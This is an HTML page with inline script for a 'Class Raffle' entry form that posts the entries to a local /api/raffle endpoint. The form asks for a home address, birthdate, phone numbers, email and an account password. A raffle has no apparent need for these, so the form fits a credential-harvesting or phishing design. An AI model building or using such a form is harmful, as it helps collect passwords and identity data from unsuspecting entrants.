<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Class Raffle</title>
  <style>
    body { font-family: system-ui, sans-serif; background: #f3f4f6; display: flex; justify-content: center; padding: 24px; }
    form { background: #fff; padding: 24px; border-radius: 12px; width: 100%; max-width: 380px; box-shadow: 0 2px 10px rgba(0,0,0,.08); }
    h1 { margin-top: 0; font-size: 1.4rem; }
    label { display: block; margin-top: 14px; font-size: .9rem; }
    input, textarea { width: 100%; padding: 10px; margin-top: 4px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 1rem; font-family: inherit; }
    button { width: 100%; margin-top: 20px; padding: 12px; border: 0; border-radius: 8px; background: #7c3aed; color: #fff; font-size: 1rem; cursor: pointer; }
    #msg { margin-top: 14px; font-size: .95rem; }
    .ok { color: #15803d; } .err { color: #b91c1c; }
  </style>
</head>
<body>
  <form id="f">
    <h1>Class Raffle Entry</h1>
    <label>Name <input name="name" required></label>
    <label>Address <textarea name="address" rows="2" required></textarea></label>
    <label>Birthdate <input name="birthdate" type="date" required></label>
    <label>Number <input name="number" type="tel" required></label>
    <label>Alternate number (optional) <input name="altNumber" type="tel"></label>
    <label>Email <input name="email" type="email" required></label>
    <label>Password <input name="password" type="password" required></label>
    <button type="submit">Enter raffle</button>
    <div id="msg"></div>
  </form>

  <script>
    const form = document.getElementById("f");
    const msg = document.getElementById("msg");
    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      const data = Object.fromEntries(new FormData(form));
      try {
        const res = await fetch("/api/raffle", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });
        const out = await res.json();
        if (res.ok) { msg.className = "ok"; msg.textContent = "You're in! Good luck!"; form.reset(); }
        else { msg.className = "err"; msg.textContent = out.error; }
      } catch {
        msg.className = "err"; msg.textContent = "Could not reach the server.";
      }
    });
  </script>
</body>
</html>
